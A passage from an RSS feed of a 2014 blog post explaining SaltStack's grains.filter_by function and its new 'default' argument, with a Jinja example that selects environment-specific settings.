&lt;li&gt;and the new argument is &lt;strong&gt;default&lt;/strong&gt;, which lets you specify which key of the &lt;em&gt;lookup dict&lt;/em&gt; should be used if you did not have the requested grain or if the requested grain value is not present in this &lt;em&gt;lookup dict&lt;/em&gt;.&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;So this function is now a really good shortcut for a default settings registry mapping.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;{% set settings = salt['grains.filter_by']({
    'unset': { 'foo': 'The coconut's tropical', 'bar': 'King Arthur'},
    'prod': { 'foo': 'Bridgekeeper', 'bar': 'We want a shrubbery' },
    'preprod': { 'foo': 'Sir Lancelot', bar: 'Blue. No, yel…'},
  },
  grain='my_env',
  merge=salt['pillar.get']('apache:lookup')),
  default='unset' 
%}
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://twitter.com/regilero&quot;&gt;Stay tuned on twitter, @regilero&lt;/a&gt;, &lt;a href=&quot;https://twitter.com/makinacorpus&quot;&gt;@makinacorpus&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>
				<published>2014-01-28 00:00:00 +0100</published>
				<link>http://regilero.github.io/saltstack/english/2014/01/28/saltstack_merge_dictionaries_of_settings_with_grains_filter_by/</link>
			</item>
		
	</channel>
</rss>
